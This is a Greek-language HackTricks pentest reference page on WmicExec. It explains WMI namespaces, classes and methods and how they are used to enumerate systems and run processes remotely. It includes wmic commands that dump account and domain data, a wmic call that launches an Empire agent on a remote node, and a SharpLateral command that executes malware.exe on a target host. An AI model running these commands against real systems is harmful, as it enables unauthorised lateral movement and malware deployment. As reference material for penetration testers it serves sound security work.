# WmicExec

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Πώς Λειτουργεί Εξηγημένο

Οι διεργασίες μπορούν να ανοίξουν σε υπολογιστές όπου το όνομα χρήστη και είτε ο κωδικός πρόσβασης είτε το hash είναι γνωστά μέσω της χρήσης του WMI. Οι εντολές εκτελούνται χρησιμοποιώντας το WMI από το Wmiexec, παρέχοντας μια ημι-διαδραστική εμπειρία κέλυφους.

**dcomexec.py:** Χρησιμοποιώντας διάφορα σημεία τερματικής DCOM, αυτό το script προσφέρει μια ημι-διαδραστική κέλυφος παρόμοια με το wmiexec.py, εκμεταλλευόμενο ειδικά το αντικείμενο DCOM ShellBrowserWindow. Υποστηρίζει αυτή τη στιγμή τα αντικείμενα MMC20. Application, Shell Windows και Shell Browser Window. (πηγή: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## Θεμελιώδης Τεχνολογία WMI

### Χώρος Ονομάτων

Ο WMI είναι οργανωμένος σε ιεραρχία παρόμοια με έναν κατάλογο, με τον κορυφαίο φάκελο του WMI να είναι το \root, κάτω από τον οποίο οργανώνονται επιπλέον φάκελοι, γνωστοί ως χώροι ονομάτων.
Εντολές για την εμφάνιση των χώρων ονομάτων:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Οι κλάσεις εντός ενός namespace μπορούν να εμφανιστούν χρησιμοποιώντας:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Κλάσεις**

Γνωρίζοντας το όνομα μιας κλάσης WMI, όπως το win32\_process, και το namespace στο οποίο ανήκει, είναι κρίσιμο για οποιαδήποτε λειτουργία WMI.
Εντολές για να εμφανιστούν οι κλάσεις που αρχίζουν με `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Επίκληση μιας κλάσης:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Μέθοδοι

Οι μέθοδοι, που είναι μία ή περισσότερες εκτελέσιμες συναρτήσεις των κλάσεων WMI, μπορούν να εκτελεστούν.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Απαρίθμηση WMI

### Κατάσταση υπηρεσίας WMI

Εντολές για να επαληθεύσετε αν η υπηρεσία WMI λειτουργεί:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Πληροφορίες συστήματος και διεργασιών

Συλλογή πληροφοριών συστήματος και διεργασιών μέσω του WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Για τους επιτιθέμενους, το WMI είναι ένα ισχυρό εργαλείο για την απαρίθμηση ευαίσθητων δεδομένων σχετικά με συστήματα ή domains.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
### **Επιτομή Επιθεσης**

Η αναζήτηση απομακρυσμένα στο WMI για συγκεκριμένες πληροφορίες, όπως τοπικοί διαχειριστές ή συνδεδεμένοι χρήστες, είναι εφικτή με προσεκτική κατασκευή των εντολών.

### **Χειροκίνητη Απομακρυσμένη Αναζήτηση στο WMI**

Η αναγνώριση κρυφών τοπικών διαχειριστών σε απομακρυσμένο υπολογιστή και συνδεδεμένων χρηστών μπορεί να επιτευχθεί μέσω συγκεκριμένων αναζητήσεων στο WMI. Το `wmic` υποστηρίζει επίσης την ανάγνωση από ένα αρχείο κειμένου για την εκτέλεση εντολών σε πολλούς κόμβους ταυτόχρονα.

Για την απομακρυσμένη εκτέλεση ενός διεργασίας μέσω WMI, όπως η εγκατάσταση ενός πράκτορα Empire, χρησιμοποιείται η παρακάτω δομή εντολής, με επιτυχή εκτέλεση που υποδηλώνεται από μια επιστρεφόμενη τιμή "0":
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Αυτή η διαδικασία απεικονίζει τη δυνατότητα του WMI για απομακρυσμένη εκτέλεση και απαρίθμηση συστήματος, αναδεικνύοντας τη χρησιμότητά του τόσο για τη διαχείριση συστήματος όσο και για τον έλεγχο διείσδυσης.


## Αναφορές
* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## Αυτόματα Εργαλεία

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
{% endcode %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
